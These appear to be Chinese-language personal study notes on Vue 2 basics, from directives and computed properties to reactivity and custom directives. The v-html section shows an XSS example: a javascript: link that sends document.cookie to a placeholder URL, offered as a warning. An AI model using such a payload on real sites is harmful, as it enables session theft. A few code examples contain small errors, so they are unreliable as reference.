---
title: Vue
date: 2023-01-15 20:30
category: Notes-Learn
comment: hidden
---

[[toc]]

> [官方文档 Vue2](https://v2.cn.vuejs.org/v2/guide/instance.html)<br>
> [官方文档 Vue3](https://cn.vuejs.org/guide/introduction.html)<br>
> [官方视频](https://learning.dcloud.io/#/?vid=0)

# 基础

## 介绍

Vue 基于虚拟 **DOM**，一种可以预先通过 JavaScript 进行各种运算，把最终的 **DOM** 操作计算出来并优化的技术，由于这个 **DOM** 操作属于预处理操作，并没有真实的操作 **DOM**，所以叫做虚拟 **DOM**。

## 模板语法

### 插值语法

数据绑定最常见的形式就是使用 **`Mustache`** 语法 (双大括号) 的文本插值：

```html
<span>Message: {{ msg }}</span>
```

1. v-once - 指令可以进行一次性地插值
2. v-html - 双大括号会将数据解释为普通文本，而非 HTML 代码。为了输出真正的 HTML，需要使用 v-html 指令：

```html
<!-- rawHtml 是 html 文本 -->
<p>Using v-html directive: <span v-html="rawHtml"></span></p>
```

3. v-bind - Mustache 语法不能作用在 HTML attribute 上，遇到这种情况应该使用 v-bind 指令：

```html
<!-- 当 isButtonDisabled 为假的布尔值，按钮无法使用 -->
<button v-bind:disabled="isButtonDisabled">Button</button>
```

4. 使用 js 表达式

### 指令

- v-bind - 用于响应式地更新 HTML attribute，<mark>单向绑定</mark>

```html
<!-- 完整语法 -->
<a v-bind:href="url">...</a>
<!-- 缩写 -->
<a :href="url">...</a>
<!-- 动态参数的缩写 (2.6.0+) -->
<a :[key]="url"> ... </a>
```

- v-model - <mark>双向绑定</mark>，但是只能应用在表单类元素上（输入类元素，如**input、select**）

v-model 默认收集的就是 value 值，v-model:value，可以简写为 v-model。

- v-on - 用于监听 **DOM** 事件

```html
<!-- 完整语法 -->
<a v-on:click="doSomething">...</a>
<!-- 缩写 -->
<a @click="doSomething">...</a>
<!-- 动态参数的缩写 (2.6.0+) -->
<a @[event]="doSomething"> ... </a>
```

### 动态参数

可以用方括号括起来的 JavaScript 表达式作为一个指令的参数。

1. 动态参数预期会求出一个字符串，异常情况下值为 null。这个特殊的 null 值可以被显性地用于移除绑定。
2. 如空格和引号，放在 HTML attribute 名里是无效的。例如：

```html
<a v-bind:['foo' + bar]="value"> ... </a>
```
变通的办法是使用**没有空格或引号的表达式，或用计算属性替代这种复杂表达式**。

## 修饰符

修饰符 (modifier) 是以半角句号` . `指明的特殊后缀，用于指出一个指令应该以特殊方式绑定。

### 键盘事件 keydown & keyup

```html
<input type="text" @keyup="showInfo">
```

```js
new Vue({
    el: '#root', 
    methods:{
        showInfo(e){
            console.log(e.target.value);//input 的 value 值
            console.log(e.keyCode);//键盘所按按键的编码，可能每种键盘不一样
            console.log(e.key);//按键名字，可以用于绑定
        },
    }
})
```

- Vue 中常用的按键别名：
  - 回车：`enter`
  - 删除：`delete`
  - 退出：`esc`
  - 空格：`tab` （特殊，需配合 `keydown` 使用）
  - 换行：`tab`
  - 上：`up`
  - 下：`down`
  - 左：`left`
  - 右：`right`

如，敲击回车键时，触发函数 showInfo

```html
<input type="text" @keyup.enter="showInfo">
```

- 可用原始 key 值去绑定，注意有多个单词要使用 ketab-case 的命名方式，如 CapsLock => caps-lock

- 系统修饰键：ctrl、alt、shift、meta，需注意：
  - 一般与 `keydown` 配合
  - 若使用 `keyup`，需要同时按下其他键，随后释放其他键，事件才被触发。（不推荐）

- 可以使用 keyCode 指定具体按键，如

```html
<input type="text" @keyup.13="showInfo">
```

一般来说，enter 的 keyCode 为13，但是不同键盘，可能编码不同，不推荐。

- Vue.config.keyCodes.(custom key name) = (keyCode)，可以定制按键别名，如

```js
 Vue.config.keyCodes.huiche = 13
 ```

 <mark>注意：</mark>

```html
<input type="text" @keyup.ctrl.y="showInfo">
```

表示需同时按下 ctrl 和 y 键，才触发函数。


## 事件处理

### Vue 绑定元素

- 第一种方式：初始化实例对象的时候，使用 `el` 属性配置
- 第二种：`vm.$mount('#root')`

### data 的两种写法

1. 对象式
2. 函数式，使用组件时，必须使用函数式

### Object.defineProperty

```js
let number = 18
const person = {
    name:'Amy',
    sex:'female',
}

Object.defineProperty(person,'age',{
    // value:18,
    enumerable:true,//控制属性是否可以枚举，默认值是 false
    writable:true,//控制属性是否可以被修改，默认是 false
    configurable:true,//控制属性是否可以被删除，默认是 false
    // 读取 age 属性时，getter 会被调用，且返回值就是 age 的值
    get(){
        return number
    },
    // age 属性被修改时，setter 会被调用，且会收到修改的具体值
    set(value){
        number = value
    }
})
```

### 事件处理

```html
<div id="root">
    <button @click="showInfo"></button>
    <button @click="showInfo2($event,18)"></button>
</div>
```

```js
new Vue({
    el: '#root', 
    methods:{
        showInfo(){
            alert('11')
        },
        showInfo2(event,value){
            console.log(event.target);//触发此函数的元素
            alert(value)
        }
    }
})
```

### 事件修饰符

1. **prevent** 阻止默认事件，如 a 标签的跳转

```html
<a href="http://..." @click.prevent="fun1">点我</a>
```

2. **stop** 阻止事件冒泡
3. **once** 事件只触发一次
4. **capture** 使用事件的捕获模式，捕获时就触发事件
5. **self** 只有 `event.target` 是当前操作的元素时才触发事件

```html
<div class="demo1" @click.self="showInfo">
    <button @click="showInfo"></button>
</div>
```

```js
new Vue({
    el: '#root', 
    methods:{
        showInfo(e){
            console.log(e.target);
        },
    }
})
```

如果不使用 self，点击 button，输出2次  `<button @click="showInfo"></button>`。

6. **passive** 事件的默认行为立即执行，无需等待事件回调执行完毕

以滚动事件为例，分为鼠标滚轮滚动 well，以及滚动条滚动 scroll。

```html
<ul @wheel="demo" class="list">
    <li>1</li>
    <li>2</li>
    <li>3</li>
    <li>4</li>
</ul>
```

wheel 事件的默认行为，滚动条滚动，要在 demo 函数执行完毕后才触发。

```html
<ul @wheel.passive="demo" class="list">
<!-- ... -->
</ul>
```

使用 passive，滚动条立即滚动，回调函数 demo 也在执行。

```html
<ul @scroll="demo" class="list">
<!-- ... -->
</ul>
```

但是 scroll 不需要使用 passive，也是立即滚动滚动条。


<mark>注意：</mark>


修饰符可以连续写

```html
<div class="demo1" @click="showInfo">
    <a href="https://..." @click.stop.prevent="showInfo"></button>
</div>
```

先阻止冒泡，再阻止 a 标签默认的跳转行为。


## [计算属性](https://v2.cn.vuejs.org/v2/guide/computed.html) computed

对于模板中任何**复杂逻辑**，都应当使用**计算属性**。

### 姓名案例

1. 使用插值语法

```html
<div id="root">
    姓：<input type="text" v-model="lastName"> <br/>
    名：<input type="text" v-model="firstName"> <br/>
    全名：<span>{{lastName}} - {{firstName}}</span>
</div>
```

```js
new Vue({
    el: '#root', 
    data:{
        lastName:'张',
        firstName:'三',
    }
})
```

但是，仅限于没有过多对数据的过多操作时，优选使用插值语法。

2. 使用 methods

```html
<div id="root">
    姓：<input type="text" v-model="firstName"> <br/>
    名：<input type="text" v-model="lastName"> <br/>
    全名：<span>{{fullName()}}</span>
    <!-- 不能简写为 {{fullName}} ，只有在绑定事件时，没有传参，才能省去括号-->
</div>
```

```js
new Vue({
    el: '#root', 
    data:{
        firstName:'张',
        lastName:'三',
    },
    methods:{
        fullName(){
            return this.lastName + ' - ' + this.firstName
        }
    }
})
```

<mark>注意：</mark>


Vue 中的 data 任一数据发生变化时，都会重新解析模板，凡是用到变化的数据，都会重新解析。但是 Vue 无法判断 methods 中的方法是否用到 data 中所变化的数据，
所以只要 data 任一数据发生变化时，模板中使用了 methods 中的方法都会重新解析，不论 methods 中的方法是否依赖 data 中改变的数据。


3. 使用计算属性

```html
<div id="root">
    姓：<input type="text" v-model="firstName"> <br/>
    名：<input type="text" v-model="lastName"> <br/>
    全名：<span>{{fullName}}</span>
    <!-- 注意，要与 methods 区分， fullName 是 vm 上的属性，不能写成 fullName() -->
</div>
```

```js
new Vue({
    el: '#root', 
    data:{
        firstName:'张',
        lastName:'三',
    },
    computed:{
        fullName:{
            // 当有人读取 fullName 时，get 被调用，且返回值作为 fullName 的值，放在 vm 上
            // get 调用：1.初次读取 fullName时；2.所依赖的数据发生变化时
            get(){
                return this.lastName + ' - ' + this.firstName
            },
            // set 调用：fullName 被修改时
            set(value){
                // this.lastName = value..
                // this.firstName = value..
            }
        }
    }
})
```

<mark>计算属性：</mark>


1. 只有通过已有属性计算，才会触发 get 的调用，如

```js
var a = 1;
new Vue({
    // ...
    computed: {
        fullName: {
            get() {
                return this.lastName + ' - ' + this.firstName + a
            },
        }
    }
    // ...
})
```

a 不是 vm 上的属性，a 变化时，fullName 不会更新。

2. computed 与 methods 相比，内部有缓存机制，效率更高。
3. 必须使用 set 函数相应修改计算属性，使用**所依赖的数据**发生改变。
4. 只需读取计算属性，可简写：

```js
// ...
computed: {
    fullName(){
        return this.lastName + ' - ' + this.firstName
    }
}
// ...
```

5. methods 和 data 中的属性，是直接放置在 vm 上的，而 computed 的属性值，是通过其中的 get 函数返回值决定的。

## 监视属性 watch

天气案例：

1. methods、computed

```html
<div id="root">
    <h2>今天的天气是{{info}}</h2>
    <button @click="changeWeather">切换天气</button>
</div>
```

```js
new Vue({
    el: '#root',
    data: {
        isHot: true,
    },
    computed: {
        info() {
            return this.isHot ? '炎热' : '凉爽'
        }
    },
    methods: {
        changeWeather() {
            this.isHot = !this.isHot
        }
    },
})
```

或者只用 computed

```html
<div id="root">
    <h2>今天的天气是{{info}}</h2>
    <button @click="isHot = ! isHot">切换天气</button>
</div>
```

```js
new Vue({
    el: '#root',
    data: {
        isHot: true,
    },
    computed: {
        info() {
            return this.isHot ? '炎热' : '凉爽'
        }
    }
})
```

注意，如果页面中没有使用 vm 上的属性，就算数据变化了页面也不会更新数据。而且，通过 Vue 指令或者语法，只能控制 vm 上的属性，window 上的函数，都无法使用。

2. watch 监视

```js
// ...
watch: {
    isHot: {
        immediate:true,//初始化时让 handler 调用一下
        // 当 isHot 发生改变时，handler 被调用
        handler(newValue,oldValue) {
        }
    }
}
// ...
```

不仅可以监视 data 上的属性，也可以监视**计算属性**。

另一种写法：

```js
vm.$watch('isHot', {
    immediate: true,
    handler(newValue, oldValue) {
    }
})
```

这种写法往往用于初始化时，无法确定属性是否需要侦听。


注意：监视属性，必须存在，**但是如果监视不存在的属性，也不会报错。**

### 深度监视

```html
<div id="root">
    <h2>a 的值是:{{numbers.a}}</h2>
    <button @click="numbers.a++">点我 a + 1</button>
    <h2>b 的值是:{{numbers.b}}</h2>
    <button @click="numbers.b++">点我 b + 1</button>
</div>
```

```js
new Vue({
    el: '#root',
    data: {
        numbers: {
            a:1,
            b:1,
        },
    },
    watch: {
        'numbers.a': {
            handler(newValue, oldValue) {
                console.log('newValue :>> ', newValue);
                console.log('oldValue :>> ', oldValue);
            }
        }
    }
})
```

上述中，a 发生变化，会触发 handler，b 变化时或者如果监视 numbers ，则不会触发 handler。


Vue 默认是可以监测到多层级的数据改变的，但是 watch 属性是不可以的，如果要监测，则要开启 deep：

```js
watch: {
    numbers: {
        deep:true,//监测多级结构中所有属性变化
        handler(newValue, oldValue) {
            console.log('newValue :>> ', newValue);
            console.log('oldValue :>> ', oldValue);
        }
    }
}
```

### 监视的简写

当 watch 只使用 handler 配置时，（不使用 deep、immediate）可以简写：

```js
// ...
watch: {
    numbers(newValue, oldValue) {
        console.log('newValue :>> ', newValue);
        console.log('oldValue :>> ', oldValue);
    }
}
// ...
```

或者

```js
vm.$watch('isHot', function (newValue, oldValue) {
    // ...
})
```

注意，不能写成箭头函数。


### 姓名案例 - watch

```html
<div id="root">
    姓：<input type="text" v-model="firstName"> <br />
    名：<input type="text" v-model="lastName"> <br />
    全名：<span>{{fullName}}</span>
</div>
```

```js
new Vue({
    el: '#root',
    data: {
        firstName: '张',
        lastName: '三',
        fullName: '张-三'
    },
    watch: {
        firstName(v1) {
            setTimeout(() => {
                this.fullName = v1 + "-" + this.lastName
            }, 1000);
        },
        lastName(v1) {
            this.fullName = this.firstName + "-" + v1
        }
    }
})
```
 
这与 computed 相比，复杂许多，但是，如果想要在 firstName 或 lastName 发生变化后 1s fullName 再改变，只能使用 watch，因为定时器改变了**计算属性的返回值**。


```js
computed: {
    fullName() {
        setTimeout(() => {
            return this.firstName + "-" + this.lastName
        }, 1000);
    },
}
```

计算属性 fullName 没有返回值，为空。


<mark>综上，有异步任务时，使用 watch。</mark>

### computed 与 watch 的区别

- computed 能完成的功能，watch 都可以完成。
- watch 能实现异步操作， computed 不能。

### 原则

- 被 Vue 管理的函数，最好写成普通函数，这样 this 指向才是 vm 或 组件实例对象。
- 所有不被 Vue 管理的函数，如定时器（`setTimeout`、`ajax` 回调函数，最好写成箭头函数，这样 this 指向才是 vm 或 组件实例对象。

## Class 与 Style 绑定

### 绑定 class：

1. 一般绑定，使用 v-bind
   
   - 只有一个样式需要动态绑定，但是类名不确定

    ```html
    <div id="root">
        <div class="basic" :class="mood" @click="changeMood"></div>
    </div>
    ```

    ```js
    new Vue({
    el: '#root',
    data: {
        mood: "normal"
    },
    methods: {
        changeMood() {
            const moods = ['normal', 'happy', 'sad'];
            const random_index = Math.floor(Math.random() * 3);
            this.mood = moods[random_index];
        }
    },
    })
    ```

   - 使用**数组**配置，多个样式动态绑定，样式个数和类名都<mark>不确定</mark>

    ```html
    <div class="basic" :class="classArr" @click="changeMood"></div>
    ```

    ```js   
    //...
    data: {
        classArr: ['normal', 'happy', 'sad']
    },
    methods: {
        changeMood() {
            this.classArr.shift()
        }
    },
    //...
    ```

    - 使用**对象**配置，多个样式动态绑定，样式个数和类名都<mark>确定</mark>，但是不确定每个样式是否都要使用

    ```html
    <div id="root">
        <div class="basic" :class="classObj" @click="changeMood"></div>
    </div>
    ```

    ```js
    //...
    data: {
        classObj: {
            "normal": true, "happy": true, "sad": true
        }
    },
    //...
    ```

2. 对象语法

在这里绑定一个返回对象的计算属性。这是一个常用且强大的模式。

```html
<div v-bind:class="classObject"></div>
```

```js
data: {
isActive: true,
error: null
},
computed: {
classObject: function () {
   return {
   active: this.isActive && !this.error,
   'text-danger': this.error && this.error.type === 'fatal'
   }
}
}
```

4. 数组语法

### 绑定 style

```html
    <div id="root">
        <div class="basic" style="font-size: 40px;"></div>
        <div class="basic" :style="{fontSize:fsize + 'px'}"></div>
        <div class="basic" :style="styleObj"></div><!-- 对象写法 -->
        <div class="basic" :style="[styleObj,styleObj2]"></div><!-- 数组写法 -->
        <div class="basic" :style="styleArr"></div><!-- 数组写法 -->
    </div>
```

```js
    new Vue({
        el: '#root',
        data: {
            fsize: 40,
            styleObj: {
                fontSize: '40px',
                color: 'red',
            },
            styleObj2: {
                backgroundColor: 'orange'
            },
            styleArr: [
                {
                    fontSize: '40px',
                    color: 'red',
                },
                {
                    backgroundColor: 'orange'
                }
            ]
        },
    })
```

注意，类型写错了 Vue 也不会报错。


## 条件渲染

- v-show 适合用于高频率切换是否显示
- v-if 适合低频率切换是否显示

v-if 和 v-else-if 类似 if...else 语句执行。


v-else 中没有条件判断。

```html
<div v-if="n === 1">1</div>
<div v-else-if="n === 2">2</div>
<div v-else-if="n === 3">3</div>
<div v-else>哈哈哈</div>
```

- 当有多个条件渲染相同时

```html
<div v-show="n === 1">
    <div>hello1</div>
    <div>hello2</div>
    <div>hello3</div>
</div>
```

使用 `template` 不会破坏页面结构。

```html
<template v-show="n === 1">
    <div>hello1</div>
    <div>hello2</div>
    <div>hello3</div>
</template>
```

## 列表渲染

### v-for

1. `v-for` 遍历**数组**

```html
<div id="root">
    <ul>
        <li v-for="p in people" :key="p.id"> {{p.name}} - {{p.age}}</li>
    </ul>
</div>
```

```js
new Vue({
    el: '#root',
    data: {
        people: [
            { id: "001", name: "张三", age: "18" },
            { id: "002", name: "李四", age: "19" },
            { id: "003", name: "王五", age: "23" },
        ]
    },
})
```

注意，遍历生成数据结构时，必须给每个元素动态绑定 `key`。

```html
<li v-for="(value,index) in people" > {{value}} - {{index}}</li>
```

上述中，`value` 是 people 中的每个元素，`index` 是元素索引值。所以，**可以用 index 动态绑定 key。**

```html
<li v-for="(value,index) in people" :key="index"> {{value}} - {{index}}</li>
<li v-for="(value,index) of people" :key="index"> {{value}} - {{index}}</li>
```

2. `v-for` 遍历**对象**

```js
//...
data: {
    car: {
        brand: "Tesla",
        price: "300 million",
        color: "black",
    }
},
//...
```

```html
<li v-for="(value,key) of car" :key="key"> {{value}} - {{key}}</li>
```

`key` 是对象键名，`value` 是对象键值。

3. `v-for` 遍历**字符串**

```html
<li v-for="(char,index) of str" :key="index"> {{char}} - {{index}}</li>
```

`char` 是每个字符元素，`index` 是每个字符索引值。

4. `v-for` 遍历**数字**

```html
<li v-for="(number,index) of numbers" :key="index"> {{number}} - {{index}}</li>
```

### key 的作用与原理

`key` 用于标识节点。

虚拟 DOM 的对比算法

<Image src="https://forting.nooooe.cn/20230204115511.png">index 作为 key</Image>

当对数据进行破坏顺序操作时，使用 index 作为 key ，新生成的真实 DOM 元素，对应会出现问题。


因为如果对比中，如果虚拟 DOM 不变，是直接使用之前的真实 DOM。

<Image src="https://forting.nooooe.cn/20230204120046.png">id 作为 key</Image>

总结：

1. index 作为 key 可能会引发问题：
   1. 对数据进行：逆序添加、逆序删除等破坏顺序的操作时，会产生没有必要的真实 DOM 更新，**效率低。**
   2. 如果结构中还包含**输入类** DOM：会产生错误 DOM 更新。


### 列表过滤

1. watch 

注意，`filter` 返回的是新数组，不改变原数组。

```html
<div id="root">
    <input type="text" placeholder="请输入名字" v-model="keyWord">
    <ul>
        <li v-for="p in filterPeople" ::key="p.id"> {{p.name}} - {{p.sex}}</li>
    </ul>
</div>
```

```js
new Vue({
    el: '#root',
    data: {
        keyWord: "",
        people: [
            { id: "001", name: "周冬雨", sex: "female" },
            { id: "002", name: "马冬梅", sex: "female" },
            { id: "003", name: "周杰伦", sex: "male" },
            { id: "004", name: "温兆伦", sex: "male" },
        ],
        filterPeople: [],
    },
    watch: {
        keyWord: {
            immediate:true,// 初始化 filterPeople
            handler(val) {
                this.filterPeople = this.people.filter(item => item.name.indexOf(val) > -1)
            }
        }
    }
})
```

2. computed

```js
//...
computed:{
    filterPeople(){
        return this.people.filter(item => item.name.indexOf(this.keyWord) > -1)
    }
}
//...
```

注意，data 中，不重复声明 `filterPeople`。


### 列表排序

注意，`sort` 会改变原数组。


按照年龄排序所搜索到的人：

```html
<div id="root">
    <input type="text" placeholder="请输入名字" v-model="keyWord">
    <button @click="sortType = 1">年龄升序</button>
    <button @click="sortType = 2">年龄降序</button>
    <button @click="sortType = 0">原顺序</button>
    <ul>
        <li v-for="p in filterPeople" ::key="p.id"> {{p.name}} - {{p.sex}} - {{p.age}}</li>
    </ul>
</div>
```

```js
new Vue({
    el: '#root',
    data: {
        keyWord: "",
        sortType: 0,
        people: [
            { id: "001", name: "周冬雨", age: 23, sex: "female" },
            { id: "002", name: "马冬梅", age: 45, sex: "female" },
            { id: "003", name: "周杰伦", age: 38, sex: "male" },
            { id: "004", name: "温兆伦", age: 21, sex: "male" },
        ],
    },
    computed: {
        filterPeople() {
            const arr = this.people.filter(item => item.name.indexOf(this.keyWord) > -1);
            if(this.sortType) {
                arr.sort((m, n) => {
                    return this.sortType === 1 ? m.age - n.age : n.age - m.age
                })
            }
            return arr;
        }
    }
})
```

计算属性使用的属性如果发生改变，都会重新进行计算。


### Vue 监测数据改变的原理

更新时的问题：

```html
<button @click="updateInfo">点我更新列表</button>
<ul>
    <li v-for="p in people" ::key="p.id"> {{p.name}} - {{p.sex}} - {{p.age}}</li>
</ul>
```

```js
//...
data: {
    people: [
        { id: "001", name: "周冬雨", age: 23, sex: "female" },
    ],
},
methods: {
    updateInfo(){
        this.people[0] = { id: "001", name: "张三", age: 33, sex: "male" }
        //this.people.splice(0,1,{ id: "001", name: "张三", age: 33, sex: "male" })
    }
},
//...
```

上述中，点击更新按钮后，数据已经发生改变，但是列表并不会发生变化。而且如果在打开 Vue 开发者工具后点击按钮，Vue 不会监测到变化。而在点击按钮后，Vue 能监测到变化，但是列表不会更新。

因为直接操作数组的**索引值**，Vue 不能监测到数组的变化。使用 `splice`，就可以正常监测改变。


1. Vue 如何监测对象改变

<Image src="https://forting.nooooe.cn/20230204141952.png">数据代理示意图</Image>

不管对象深度有多少，Vue 都能监测改变。下列的 `a`、`b`、`name1`、`name2`，都能监测到。

```js
//...
data: {
    age:18,
    numbers:{
        a:1,
        b:2
    },
    people:[
        {
            name1:'张三',
            name2:'李四'
        }
    ]
},
//...
```

- <mark>Vue.set()</mark>

如果想在 student 上添加新的属性 ，使用 `vm._data.student.sex = 'male'` 或 ``vm.student.sex = 'male'`，都没有为 `sex` 设置数据代理，Vue 不能监测到 `sex`。

```js
//...
data: {
    student:{
        name:'张三',
    }
},
//...
```

注意，上述中，如果模板读取 `student.sex`，不会报错，因为 undefined 显示为空。

`Vue.set(target,key,val)` 的使用：

- `Vue.set(vm._data.student.sex,'sex','male')` | `Vue.set(vm.student.sex,'sex','male')`
- `vm.$set(vm._data.student.sex,'sex','male')` | `vm.$set(vm.student.sex,'sex','male')`
- 使用 method：

```html
<p v-show="student.sex">{{student.sex}}</p>
```

```js
//...
methods: {
    addSex(){
        Vue.set(this.student,'sex','male')
    },
    addSex2(){
        this.$set(this.student,'sex','male')
    }
},
//...
```

<mark>Vue.set()的局限性：不能在 Vue 实例，或者 Vue 实例的跟数据对象上添加属性，如 data。</mark>



1. Vue 如何监测数组改变

- 没有为数组中的元素设置 getter 和 setter，如下列的 hobby 属性，如果使用 `vm._data.hobby[0] = 'dancing'`，Vue 是无法监测到的。

```js
data: {
    hobby: ['play games', 'drink water', 'watch TV'],
},
```

但是，如果使用<mark>能改变数组自身的方法</mark>，Vue 是可以监测的：`push`，`pop`，`shift`，`unshift`，`splice`，`sort`，`reverse`。


注意：**Vue 上的这些数组方法与原始的数组方法是不一样的**，如 `vm._data.hobby.push === Array.prototype.push` 的值是 false。


当然，使用 `Vue.set(vm.hobby,0,'dancing')`，也可以正常监测。

### Vue 监视数据总结

1. Vue 会监视 data 中所有层次的数据。
2. 监测对象：如果在 new Vue 时没有传入要监测的数据，要使用 `Vue.set()`（`vm.$set()`）添加属性才能给后添加的属性做**响应式**。
3. 监测数组：通过**包裹**数组更新元素的方法。
4. 在 Vue 中修改数组中的某个元素一定要用如下方法：`push`，`pop`，`shift`，`unshift`，`splice`，`sort`，`reverse`，或者 `Vue.set`（`vm.$set`）。
5. 注意： `Vue.set`（`vm.$set`）不能给 vm 或者 vm 的**根数据对象**添加属性。


## v-model 收集表单数据

v-model 默认收集 input 的 value 值。

```html
<form @submit.prevent="send"><!-- @submit.prevent 阻止表单提交后跳转的默认行为 -->
    <label for="account">账号：</label>
    <input type="text" id="account" v-model.trim="account"><br><br>
    <!-- .trim 修饰符，去掉前后空格 -->
    <label for="password">密码：</label>
    <input type="password" id="password" v-model.trim="password"><br><br>

    性别：
    男<input type="radio" name="sex" v-model="sex" value="male">
    女<input type="radio" name="sex" v-model="sex" value="female"><br><br>

    年龄：
    <!-- .number 修饰符将 age 转换为数字类型数据，type="number"限制只能输入数字-->
    <!-- 如果type="text"，输入 '18aaa11' ，age 的值为 18 -->
    <input type="number" v-model.number="age"><br><br>

    爱好：
    打游戏<input type="checkbox" name="hobby" v-model="hobby" value="game">
    看电视<input type="checkbox" name="hobby" v-model="hobby" value="TV">
    读书<input type="checkbox" name="hobby" v-model="hobby" value="book"><br><br>

    所属校区：
    <select v-model="city"><!-- 注意，如果单独为每个 option 绑定 v-model，是不起作用的 -->
        <option value="">== 请选择 ==</option>
        <option value="shanghai">上海</option>
        <option value="beijing">北京</option>
    </select><br><br>

    其他信息：
    <!-- .lazy 修饰符作用：在 textarea 失去焦点的时候，才监测收集数据 -->
    <textarea v-model.lazy="otherinfo"></textarea><br><br>

    <input type="checkbox" v-model="agree"> 阅读并接受<a href="https://...">《用户协议》</a><br><br>

    <button>提交</button>
</form>
```

```js
//...
data: {
    account: "",
    password: "",
    sex: 'female',
    age: '',
    hobby: [],// hobby 的初始值，影响 v-model 收集的数据，hobby 不能初始化为字符串
    city: '',
    otherinfo: '',
    agree: ''

},
methods: {
    send() {
        // 收集表单所有数据：
        console.log(JSON.stringify(this._data));
    }
},
//...
```
补充：`v-model.number` 将收集到的 value 值强制转换为数字。

## 过滤器 filters

对要显示的数据进行特定格式化后再显示，适用于一些**简单逻辑的处理**。

过滤器可以对数据进行加工，如通过处理时间戳显示当前时间：

```html
<p>显示当前时间：{{time | timeFormatter}}</p> <!-- 2023/2/4 21:50:28 -->
<p>显示当前时间：{{time | timeFormatter('yyyy-mm-dd')}}</p> <!-- 2023/2/4 21:50:28 -->
<p>显示当前时间：{{time | timeFormatter('yyyy-mm-dd') | strSlice}}</p> <!-- 2023 -->
```

```js
// ...
data: {
    time:1675518628716
},
filters:{
    timeFormatter(val,val2 = 'yyyy'){
        return new Date(val).toLocaleString();
    },
    strSlice(val){
        return val.slice(0,4)
    }
}
// ...
```

1. 过滤器传参：

vm.time 作为**参数**传递给 timeFormatter，且 timeFormatter 的返回值作为插值语法的显示结果，但是**并没有改变原来的数据**。在这里，timeFormatter 可以接受外部参数，第二个参数是 `'yyyy-mm-dd'`，默认第二个参数是 `'yyyy'`。

2. 过滤器能进行串联 `strSlice` 接受 `timeFormatter` 的返回值作为参数。
3. 上述中的 `timeFormatter`、`strSlice` 作为**局部过滤器**，只能用于当前 Vue 实例。
4. 全局过滤器，在 new Vue 之前配置，如将 `strSlice` 作为全局过滤器。

```js
Vue.filter('strSlice',function (val) {
    return val.slice(0,4)
})
```

5. 除了插值语法，配合 v-bind 使用过滤器：

```html
<p :x="time | strSlice"></p>
```

<mark>注意，v-model 中无法使用过滤器。</mark>

### 内置指令

除了 `v-bind`(`:xxx`)，`v-model`，`v-for`，`v-on`(@),`v-if`,`v-else`,`v-show`。

1. v-text
  
```html
<p>你好，{{name}}</p>
<p v-text="name"></p>
```

`{{}}` 与相比 `v-tex` 相比，更灵活，易于字符串的拼接。v-text 无法解析 html 元素。

2. v-html 能够解析 html 元素。但是有安全性问题，如对于浏览器的 Cookie：

```js
//...
data: {
    _html:`<a href="javascript:location.href='https://...?' + document.cookie"></a>`
},
//...
```

`document.cookie` 能携带浏览器当前所有非 `HttpOnly` 的 Cookie。

注意：

- `v-html` 与 `v-text` 一样，会替换掉节点内的所有内容，`{{}}` 不会。
- `v-html` 有安全性问题，一定要造可信的内容上使用 `v-html`，不要用在用户输入的内容上！因为动态渲染 HTML 是非常危险的，容易导致 XSS 攻击。

3. v-cloak

不允许未经解析的模板展示在页面。

```css
<style>
    [v-cloak]{
        display: none;
    }
</style>
```

```html
<div v-cloak>{{name}}</div>
```

当 vue 因为 js 阻塞未引入时，带有 v-cloak 属性的元素不显示，直到 vue 引入后，该元素的 v-cloak 会自动移除。

4. v-once

v-once 所在节点在**初次动态渲染后，就被视为静态内容**。以后数据的改变不会引起 v-once 所在结构的更新。

5. v-pre

作用：跳过其所在节点的编译过程。用于：没有使用指令语法、插值语法的节点，**加快编译。** 


## 自定义指令

需自己操作 DOM 元素。

1. 函数式

**自定义 v-big 指令，将绑定的数值放大 10 倍。**

```html
<div id="root">
    <h2>{{name}}</h2>
    <h2>当前 n 值：<span v-text="n"></span></h2>
    <h2>放大 10 倍的 n 值：<span v-big="n"></span></h2>
    <button @click="n++">点我 n + 1</button>
</div>
```

```js
//...
data: {
    name:'Amy',
    n:1,
},
directives:{
    big(element,binding){
        element.innerText = binding.value * 10
    }
}
//...
```

big 接受的参数 element 是绑定所在元素的真实 DOM 节点，binding 接收 data.n 作为 value。


big 函数何时会调用：

- 指令与元素成功绑定时；
- 指令所在的模板被重新解析时:

注意，上述中，如果只有 data.name 发生改变时，big 也会被调用，<mark>因为整个 `root` 模板都会被重新解析</mark>。


>> 为什么 data.name 改变的时候，big 也会被调用呢？

自定义指令简写为函数时，相当于配置了 bind 和 update 属性，在 VNode 更新时都会被调用。每次修改属性，调用 render 配置，生成新的虚拟 DOM - VNode，mount 再将新旧 VNode 对比，在此过程中，
会重新计算 v-big 指令的值，前后是否一致。

2. 对象式

**自定义 v-fbind 指令，在 input 框一加载，就获取焦点**

```html
<button @click="n++">点击 n + 1</button><br>
<input type="text" v-fbind:value="n">
```

```js
//...
directives: {
    fbind(element,binding){
        element.value = binding.value;
        element.focus();
    }
},
//...
```

这种函数式写法，会出现问题：初始化页面没有获取焦点，但是一点击 button ，input 框能正常获取焦点。原因：fbind 在指令与元素成功绑定时被调用的时候，input 元素还未加载至页面。
（input 框要通过 Vue 编译才被放置页面）


解决：配置 inserted

```js
directives: {
    fbind:{
        bind(ele,binding){
            ele.value = binding.value;
        },//指令与元素成功绑定时被调用
        inserted(ele,binding){
            ele.focus();
        },//指令所在元素被插入也面时被调用
        update(ele,binding){
            ele.value = binding.value;
            ele.focus();
        },//指令所在模板被重新解析时被调用
    }
},
```

3. 总结

- 指令命名：多个字母组合时：

```html
<input type="text" v-big-number:value="n">
```

```js
//...
data: {
    n: 1,
},
directives: {
    // 两种等价简写
    'big-number'(){
    },
    'big-number':function(){
    }
},
//...
```

- directives 配置里的函数 `this` 均指向 window，要想用 vue 中的属性值，如上 input 传入。
- 设置全局自定义指令，类似全局过滤器：

```js
// 两种等价写法
Vue.directive('big-number',{
    bind(){},
    inserted(){},
    update(){},
});

Vue.directive('big-number',function (ele,binding) {
});
```


## 生命周期

生命周期函数：Vue 在关键时刻帮我们调用的一些特殊名称的函数。函数中的 this 指向时 **vm** 或者**组件实例对象**。 

### mounted

<mark>Vue 完成模板的解析并把**初始**的真实的 DOM 元素放入页面后（挂载完毕）调用 mounted。</mark>

- 使用定时器改变样式

```html
<h2 :style="{opacity}">Welcom to Vue!</h2>
```

```js
//...
data: {
    opacity: 1,
},
methods: {
    change() {
        setTimeout(() => {
            this.opacity -= 0.01;
            if (this.opacity <= 0) this.opacity = 1
        }, 16);
    }
},
//...
```

